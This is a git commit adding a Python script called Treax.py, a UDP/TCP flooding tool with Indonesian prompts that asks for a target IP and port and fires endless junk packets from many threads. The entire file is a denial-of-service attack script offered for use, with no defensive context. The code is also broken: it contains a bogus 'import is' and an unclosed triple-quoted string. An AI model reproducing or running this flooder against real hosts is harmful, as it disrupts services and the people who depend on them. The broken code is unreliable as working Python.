2af5f64ae1b61ecb880dfc4f97eda4c9d73bb34f
JielXVz <101916042+JielXVz@users.noreply.github.com>
2022-06-22 10:25:17 +0700

    Create Treax.py

---
+++ Treax.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python3
+import random
+import socket
+import threading
+import is
+import codecs, sys
+
+print('''
+    
+ip = str(input("  Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
+times = int(input(" Paket Nya Mau Berapa:"))
+threads = int(input(" Pelor Nya Tembakin Berapa:"))
+def run():
+	data = random._urandom(1000)
+	i = random.choice(("[+]","[-]","[=]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" TREAX COMMUNITY!!! ")
+		except:
+			print("[-] Server Has Been Maintenance")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" TREAX COMMUNITY!!! ")
+		except:
+			s.close()
+			print("[-] Server Has Been Maintenance")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
